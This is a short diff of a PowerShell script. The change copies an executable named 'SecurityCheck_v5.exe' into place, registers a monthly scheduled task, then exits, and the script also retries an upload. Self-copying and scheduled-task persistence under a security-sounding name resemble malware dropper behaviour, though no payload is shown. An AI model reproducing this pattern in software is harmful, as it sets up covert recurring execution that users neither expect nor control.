@@ -34,13 +34,15 @@ function Add-MonthlyTaskIfNotExists {
     }
 }
 
+
 function Self-CopyIfNeeded {
-    if ($MyInvocation.MyCommand.Path -ne $ScriptPath) {
-        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $ScriptPath -Force
+    if (-not (Test-Path $ScriptPath)) {
+        Copy-Item -Path "$PSScriptRoot\SecurityCheck_v5.exe" -Destination $ScriptPath -Force
         Add-MonthlyTaskIfNotExists
         exit
     }
 }
+
 
 Self-CopyIfNeeded
 Retry-FailedUpload
